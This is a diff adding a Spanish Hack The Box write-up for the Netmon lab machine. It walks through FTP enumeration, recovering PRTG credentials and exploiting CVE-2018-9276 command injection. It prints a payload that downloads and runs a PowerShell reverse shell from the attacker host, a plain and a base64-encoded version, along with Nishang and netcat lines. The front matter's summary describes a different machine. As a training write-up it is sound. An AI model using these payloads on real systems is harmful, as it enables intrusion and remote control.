@@ -1,9 +1,263 @@
 ---
 title: Netmon
-date: '2023-07-07'
+date: '2023-07-09'
 lastmod: '2023-08-05'
 tags: ['labs', 'HackTheBox']
-draft: true
+draft: false
 summary: 'Lame is a beginner-level machine that only requires one exploit to gain root access. It was the first machine published on Hack The Box and is often the first machine for new users.'
 images: ['/static/images/htb/lame/Lame.png']
 ---
+
+![Portada](/static/images/htb/netmon/netmon.png)
+
+{' '}
+<br></br>
+
+<TOCInline toc={props.toc} exclude="Introduccion" />
+
+## RECONOCIMIENTO
+
+### Ping
+
+Primero que nada verificamos estar en la misma red que la maquina victima enviandole un paquete de datos a la ip 10.10.10.152 con el comando ping.
+
+```js
+  ping -c 4 10.10.10.152
+```
+
+- `-c` : Cantidad de paquetes de solicitud de eco ICMP (Internet Control Message Protocol) que se enviaran.
+
+![Ping](/static/images/htb/netmon/ping.png)
+
+### Nmap
+
+Luego, realizamos el escaneo de puertos.
+
+```js
+  nmap -p- --open 10.10.10.152 -Pn
+```
+
+- `-p-` : Escanea todos los puertos.
+- `--open` : Solo va a reportar los puertos que encuentre abiertos.
+- `-Pn` : Realiza el escaneo incluso si el dispositivo no responde a los pings.
+
+![Nmap](/static/images/htb/netmon/nmap1.png)
+
+Al obtener la lista de los puertos abiertos en la maquina victima,realizamos otro escaneo pero solo a los que
+nmap reporto como abiertos incluyendo las siguientes flags:
+
+- `-sC` : Activa el escaneo utilizando scripts de enumeración y detección de servicios predeterminados. Los scripts se ejecutan contra los puertos abiertos para obtener información adicional sobre los servicios en ejecución.
+- `-sV` : Realiza una detección de versión de los servicios que se encuentran en los puertos abiertos. Nmap intenta determinar la versión y el tipo de servicio utilizando diversos métodos, como el envío de solicitudes específicas y la comparación de las respuestas recibidas.
+- `-p` : Especifica los puertos que se escanearán. En este caso, se están escaneando los puertos 21 (FTP), 22 (SSH), 139 (NetBIOS/SMB), 445 (SMB) y 3632 (distccd).
+- `-Pn` : Indica a Nmap que realice el escaneo incluso si el dispositivo no responde a los pings. Esto puede ser útil cuando el dispositivo tiene configuraciones de firewall que bloquean los paquetes ICMP de solicitud de eco.
+
+```js
+  nmap -sC -sV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49669 10.10.10.152 -Pn
+```
+
+![Nmap2](/static/images/htb/netmon/nmap2.png)
+
+### Puertos abiertos
+
+| Puertos abiertos                                                                                              | Servicio    | Version                                              |
+| ------------------------------------------------------------------------------------------------------------- | ----------- | ---------------------------------------------------- |
+| **_21/tcp_**                                                                                                  | ftp         | Microsoft ftpd                                       |
+| **_80/tcp_**                                                                                                  | http        | PRTG/18.1.37.13946                                   |
+| **_135/tcp_**                                                                                                 | msrpc       | Microsoft Windows RPC                                |
+| **_445/tcp_**                                                                                                 | netbios-ssn | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds |
+| **_5985/tcp_** <br></br> **_47001/tcp_**                                                                      | http        | Microsoft-HTTPAPI/2.0                                |
+| **49664/tcp** <br></br> **49665/tcp** <br></br> **49666/tcp** <br></br> **49667/tcp** <br></br> **49669/tcp** | msrpc       | Microsoft Windows RPC                                |
+
+## ENUMERACION
+
+### Puerto 21 - FTP
+
+El puerto 21 se utiliza comúnmente para el protocolo FTP (File Transfer Protocol), que es un protocolo estándar para la transferencia de archivos entre sistemas informáticos en una red. El protocolo FTP permite a los usuarios transferir archivos de un equipo a otro a través de una red. El puerto 21 se utiliza para establecer la conexión de control entre el cliente FTP y el servidor FTP. En esta conexión, el cliente envía comandos al servidor para solicitar operaciones como la autenticación del usuario, listar archivos en el servidor, crear directorios, descargar o subir archivos, entre otros. Es importante tener en cuenta que el protocolo FTP es un protocolo no seguro, ya que la información se transmite en texto plano, incluyendo las credenciales de inicio de sesión.
+
+En la etapa de reconocimiento vimos como el acceso anonimo estaba permitido, entonces nos
+conectamos por ftp a la maquina vicitima para ver si encontramos algo.
+
+![Ftp](/static/images/htb/netmon/ftp.png)
+
+Dentro de ella recorremos los directorios hasta llegar a Users y dentro de ella encontrar la
+primer flag.
+
+![Ftp](/static/images/htb/netmon/ftp1.png)
+![Ftp](/static/images/htb/netmon/ftp2.png)
+
+Para transferirnos el archivo user.txt a nuestra maquina usamos el comando get.
+
+```shell
+  ftp> get user.txt
+```
+
+Inspeccionando por otros directorios , llegamos a la carpeta con el nombre `PRTG Network Monitor` el
+cual ya vimos en la etapa de reconocimiento, que en el puerto 80 se estaba brindando por el servicio http
+una version de `PRTG`.
+![Ftp](/static/images/htb/netmon/ftp3.png)
+
+### Puerto 80 - HTTP
+
+El puerto 80 se utiliza comúnmente para el protocolo de transferencia de hipertexto (HTTP), que es el protocolo utilizado para enviar y recibir páginas web en la World Wide Web. Es el puerto predeterminado utilizado por los servidores web para escuchar las solicitudes de los clientes y enviarles las páginas web solicitadas.
+
+Cuando ingresas una URL en tu navegador web (por ejemplo, http://www.ejemplo.com), el navegador establece una conexión con el servidor web en el puerto 80 y envía una solicitud HTTP para obtener la página web correspondiente. El servidor web escucha en el puerto 80 y responde a la solicitud enviando los datos de la página web al navegador.
+
+Nos dirigimos a la url `http://10.10.10.152:80` del navegador y nos encontramos con una pagina de PRTG Network Monitor.
+
+![Prtg](/static/images/htb/netmon/prtg.png)
+
+#### PRTG Network Monitor
+
+PRTG Network Monitor es una solución de monitoreo de red desarrollada por Paessler AG. Proporciona herramientas y funcionalidades para supervisar y gestionar redes informáticas de manera efectiva. Con PRTG, los administradores de red pueden obtener una visión completa del rendimiento y la salud de su infraestructura de red.
+
+La herramienta proporciona una interfaz intuitiva y personalizable donde los administradores pueden visualizar los datos de monitoreo en tiempo real a través de gráficos, tablas y mapas. PRTG también permite la generación de informes automatizados y el envío de alertas en caso de eventos o condiciones anormales en la red, lo que ayuda a los administradores a tomar medidas rápidas para solucionar problemas y mantener un rendimiento óptimo de la red. En resumen, PRTG en un NMS(Network Management System).
+
+Luego de una breve introduccion a PRTG, como no tenemos credenciales validas y luego de haber realizado un
+fuzzing de directorios, el cual, no nos devolvio nada util, buscamos en google sobre credenciales por default
+en PRTG.
+
+![Prtg](/static/images/htb/netmon/prtg1.png)
+
+Encontramos `prtgadmin:prtgadmin`, las probamos y no han servido.
+
+![Prtg](/static/images/htb/netmon/prtg2.png)
+
+Investigamos mas acerca de credenciales de PRTG en google y encontramos un [post de Reddit](https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/). Ya que tenemos acceso por ftp podemos buscar esos archivos y ver si hay credenciales para usar alli.
+
+![Prtg](/static/images/htb/netmon/prtg4.png)
+
+Para ver los directorios ocultos en windows escribimos `dir -a`.
+
+![Prtg](/static/images/htb/netmon/prtg5.png)
+
+Encontramos los archivos que buscabamos.
+![Prtg](/static/images/htb/netmon/prtg6.png)
+
+Dentro de Configuration.old.bak encontramos unas credenciales.
+
+![Prtg](/static/images/htb/netmon/prtg7.png)
+
+Usamos `prtgadmin:PrTg@dmin2018`, y no funcionan. En vez de 2018, usamos 2019 y obtenemos acceso.
+![Prtg](/static/images/htb/netmon/dashboard.png)
+
+## EXPLOTACION
+
+Buscando vulnerabilidades para PRTG nos topamos con [esta pagina](https://vulmon.com/searchpage?q=prtg+network+monitor&page=2) la cual tiene una vulnerabilidad de [inyeccion de comandos](https://vulmon.com/vulnerabilitydetails?qid=CVE-2018-9276&scoretype=cvssv3) y que fue testeada en la version en la que estamos auditando.
+
+![Explotation](/static/images/htb/netmon/exp.png)
+
+La persona que descubrio esa vulnerabilidad nos da detalles y deja la [pagina web](https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/), donde explica
+el paso a paso de la explotacion.
+
+![Explotation](/static/images/htb/netmon/exp1.png)
+
+**_La pagina web actual tiene las fotos dañadas. Dejo un snapshot que encontre en [WaybackMachine](https://web.archive.org/web/20210308021046/https://www.codewatch.org/blog/?p=453)_**
+
+Vamos a setup -> Notifications -> Add New Notification
+![Explotation](/static/images/htb/netmon/exp2.png)
+![Explotation](/static/images/htb/netmon/exp3.png)
+
+Antes que nada, en una terminal de nuestra maquina atacante escribimos el comando `tcpdump -i tun0 icmp`, esto nos permitira capturar trafico ICMP entrante.
+
+```js
+  tcpdump -i tun0 icmp
+```
+
+- `tcpdump`: es una herramienta de captura y análisis de paquetes de red. Permite visualizar y analizar el tráfico que pasa por una interfaz de red.
+- `-i tun0`: especifica la interfaz de red en la que se capturarán los paquetes. En este caso, "tun0" es el nombre de la interfaz.
+- `icmp`: indica que se deben capturar los paquetes ICMP. ICMP es un protocolo de la capa de red utilizado para el envío de mensajes de control y notificación entre dispositivos en una red IP. Los paquetes ICMP incluyen, por ejemplo, los mensajes de solicitud y respuesta de "ping".
+
+Luego, en la web de PRTG, elegimos como Program File la opcion ps1 y agregamos el comando ping, para verificar que tenemos capacidad de ejecutar comandos desde el servidor, enviandonos una traza ICMP desde la maquina victima a la nuestra.
+
+![Explotation](/static/images/htb/netmon/exp4.png)
+
+Recibimos la traza ICMP, lo que significa que es vulnerable a inyeccion de comandos, lo que debemos hacer ahora
+es conseguir una reverse shell.
+![Explotation](/static/images/htb/netmon/exp5.png)
+
+Para obtener una reverse shell vamos a utilizar el repositorio de [Nishang](https://github.com/samratashok/nishang)
+
+> Nishang es un framework y una colección de scripts y payloads que permite el uso de PowerShell para seguridad ofensiva, pruebas de penetración y red teaming. Nishang es útil durante todas las fases de las pruebas de penetración.
+
+Vamos a usar `Invoke-PowerShellTcp.ps1`, entonces, luego de descargar el repositorio,
+nos copiamos el archivo mencionado a nuestro directorio de trabajo actual.
+
+📝 <u>SIEMPRE ES BUENO MANTENER TODO ORDENADO Y CENTRALIZADO</u> 😉
+
+![Explotation](/static/images/htb/netmon/exp6.png)
+
+Abrimos la shell con un editor de texto y agregamos al final del todo la siguiente linea
+teniendo en cuenta de cambiar la IP y el puerto por el cual quieren escuchar.
+
+```shell
+  Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 1234
+```
+
+- `Invoke-PowerShellTcp`: Es un cmdlet de PowerShell que permite iniciar una sesión de PowerShell a través de una conexión TCP.
+- `-Reverse`: Es un parámetro que indica que se debe establecer una conexión inversa en lugar de una conexión saliente. En una conexión inversa, el servidor espera una conexión del cliente en lugar de que el cliente inicie la conexión.
+- `-IPAddress 10.10.14.2`: Es el parámetro que especifica la dirección IP del servidor remoto al que se desea conectar.
+- `-Port 1234`: Es el parámetro que especifica el número de puerto en el que el servidor remoto está escuchando para aceptar la conexión.
+
+![Explotation](/static/images/htb/netmon/exp7.png)
+
+Guardamos y cambiamos el nombre a uno mas amigable a la hora de escribir.
+
+![Explotation](/static/images/htb/netmon/exp8.png)
+
+Luego, iniciamos un servidor con python en cualquier puerto en escucha, donde reside el script de la shell que se
+invocara desde PRTG.
+
+```python
+  python -m http.server 4646
+```
+
+Este comando inicia un servidor web simple en el puerto 4646 utilizando Python. Al ejecutar este comando, Python proporciona un servidor web incorporado que puede ser útil para compartir archivos o páginas web estáticas de forma rápida y sencilla en una red local.Una vez que el servidor está en funcionamiento, puede acceder a los archivos y páginas web almacenados en el directorio actual del terminal a través de un navegador web utilizando la dirección IP de la máquina donde se está ejecutando el servidor y el puerto 4646. Por ejemplo, si estás ejecutando el servidor en tu máquina local, puedes acceder a los archivos y páginas web utilizando la dirección "http://localhost:4646" o la dirección IP de tu máquina seguida del puerto, por ejemplo, "http://tu_direccion_ip:4646".
+
+![Explotation](/static/images/htb/netmon/exp9.png)
+
+Y dejamos otro puerto en escucha donde recibiremos la reverse shell.
+
+```js
+  nc -nlvp 1234
+```
+
+Esto crea un listener en el puerto 1234 de la máquina local, lo que significa que Netcat estará a la espera de conexiones entrantes en ese puerto. Esto es útil para establecer una conexión de red entre dos máquinas y permitir que una de ellas actúe como servidor o receptor de datos en el puerto especificado.
+
+- `-n`: Indica a Netcat que no realice la resolución inversa de las direcciones IP o nombres de host.
+- `-l`: Activa el modo de escucha, permitiendo que Netcat escuche conexiones entrantes en lugar de iniciar una conexión saliente.
+- `-v`: Habilita el modo verboose (detallado) y muestra información adicional sobre las conexiones entrantes y salientes.
+- `-p 1234`: Especifica el número de puerto en el que Netcat debe escuchar las conexiones entrantes. En este caso, el puerto elegido es el 4646.
+
+Volvemos al panel de edicion de notificaciones, y en parametro agregamos el siguiente comando
+
+```js
+  activeport | IEX(New-Object Net.WebClient).downloadString("http://10.10.14.2:4646/shell.ps1")
+```
+
+`IEX(New-Object Net.WebClient).downloadString("http://10.10.14.2:4646/shell.ps1")` es una línea de código en PowerShell que descarga y ejecuta un script llamado `shell.ps1` desde la dirección URL `http://10.10.14.2:4646`.
+
+Desglosemos el comando:
+
+- `IEX`: Es un alias de PowerShell para el cmdlet "Invoke-Expression", que se utiliza para ejecutar código o comandos como una cadena.
+- `(New-Object Net.Webclient)`: Crea una nueva instancia del objeto WebClient de .NET Framework. WebClient es una clase que proporciona métodos para descargar contenido desde una dirección URL.
+- `.downloadString("http://10.10.14.7:4646/shell.ps1")`: Utilizando el objeto WebClient, se llama al método "downloadString" y se le pasa la URL del script "shell.ps1" que se encuentra en el servidor remoto en la dirección "http://10.10.14.7:4646". El método DownloadString descarga el contenido del script como una cadena.
+  En resumen, este comando descarga el contenido de un archivo de script llamado "shell.ps1" desde la dirección URL especificada y luego ejecuta ese script en el entorno de PowerShell local. Esto puede ser utilizado para realizar diversas acciones, dependiendo del contenido y funcionalidad del script. Es importante destacar que el uso de comandos como este debe realizarse con precaución y solo en entornos controlados y autorizados, ya que puede ser utilizado con fines maliciosos si se utiliza de manera inapropiada.
+
+![Explotation](/static/images/htb/netmon/exp11.png)
+
+Cargamos y no funciona,puede que la aplicacion no este interpretando bien los caracteres del comando.
+Para evitar eso, vamos a codificarlo en base64.
+
+![Explotation](/static/images/htb/netmon/exp12.png)
+
+- `echo "activeport | IEX(New-Object Net.WebClient).downloadString("http://10.10.14.2:4646/shell.ps1")`: El comando echo simplemente muestra el texto entre comillas en la salida estándar. En este caso, el texto es un comando de PowerShell que se pasará a los siguientes comandos en la cadena de tuberías.
+
+- `iconv -t UTF-16LE` : El comando iconv se utiliza para convertir la codificación de caracteres de un texto. En este caso, se está convirtiendo el texto de la salida anterior a UTF-16LE (UTF-16 Little Endian), que es una codificación de caracteres ampliamente utilizada en entornos Windows.
+
+- `base64 -w0` : El comando base64 se utiliza para codificar y decodificar datos en formato Base64. En este caso, se está codificando el texto convertido en el paso anterior a Base64. El argumento -w0 se utiliza para evitar que se inserten saltos de línea en la salida codificada.
+
+Y cambiamos el parametro anterior por este otro:
+
+```shell
+  activeport | powershell -encodedCommand aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAOgA0ADYANAA2AC8AcwBoAGUAbABsAC4AcABzADEAJwApAAoA
+```
